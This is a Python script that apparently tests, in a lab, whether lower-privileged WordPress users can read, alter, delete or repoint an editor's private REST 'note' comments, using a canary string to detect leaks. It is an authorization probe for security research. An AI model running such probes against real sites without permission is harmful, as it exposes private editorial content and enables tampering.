#!/usr/bin/env python3
"""Authorization probe for the 7.1 'notes' comment type."""
import json
from wplab import sess, BASE
import requests

admin = sess("admin")
editor = sess("editor")
author = sess("author")
contrib = sess("contributor")
sub = sess("subscriber")
anon = requests.Session()

# Editor's own published post, with a private editorial note on it.
r = editor.rest("POST", "/wp/v2/posts", json={
    "title": "editor secret post", "content": "body", "status": "publish"})
pid = r.json()["id"]
r = editor.rest("POST", "/wp/v2/comments", json={
    "post": pid, "type": "note", "content": "SECRET-NOTE-CANARY internal review text"})
print("editor create note:", r.status_code, r.text[:200])
nid = r.json().get("id")

# Contributor's own draft, for the "can I move my note" test.
r = contrib.rest("POST", "/wp/v2/posts", json={"title": "contrib draft", "content": "x"})
cpid = r.json()["id"]

def probe(name, s, method, route, **kw):
    if s is None:
        r = anon.request(method, BASE + "/index.php?rest_route=" + route, **kw)
    else:
        r = s.rest(method, route, **kw)
    leak = "SECRET-NOTE-CANARY" in r.text
    print(f"  {name:34s} {r.status_code} leak={leak}  {r.text[:110]}")
    return r

print("\n== read the editor's note ==")
for label, s in [("anon", None), ("subscriber", sub), ("contributor", contrib),
                 ("author", author), ("editor", editor), ("admin", admin)]:
    probe(f"{label} GET comments?type=note&post", s, "GET", f"/wp/v2/comments&type=note&post={pid}")
    probe(f"{label} GET comments?type=note", s, "GET", "/wp/v2/comments&type=note")
    probe(f"{label} GET comments/<id>", s, "GET", f"/wp/v2/comments/{nid}")
    probe(f"{label} GET comments/<id>&ctx=edit", s, "GET", f"/wp/v2/comments/{nid}&context=edit")
    probe(f"{label} GET search-ish ?search", s, "GET", "/wp/v2/comments&search=SECRET-NOTE-CANARY")

print("\n== write the editor's note ==")
for label, s in [("subscriber", sub), ("contributor", contrib), ("author", author)]:
    probe(f"{label} create note on editor post", s, "POST", "/wp/v2/comments",
          json={"post": pid, "type": "note", "content": "pwn"})
    probe(f"{label} update editor note", s, "POST", f"/wp/v2/comments/{nid}",
          json={"content": "pwn"})
    probe(f"{label} delete editor note", s, "DELETE", f"/wp/v2/comments/{nid}&force=true")

print("\n== contributor creates note on own draft, then repoints it ==")
r = contrib.rest("POST", "/wp/v2/comments", json={
    "post": cpid, "type": "note", "content": "mine"})
print("  create on own draft:", r.status_code, r.text[:160])
if r.status_code in (200, 201):
    mynote = r.json()["id"]
    r2 = contrib.rest("POST", f"/wp/v2/comments/{mynote}", json={"post": pid})
    print("  repoint to editor post:", r2.status_code, r2.text[:200])
    r3 = contrib.rest("POST", f"/wp/v2/comments/{mynote}", json={"type": "comment"})
    print("  convert note->comment:", r3.status_code, r3.text[:200])
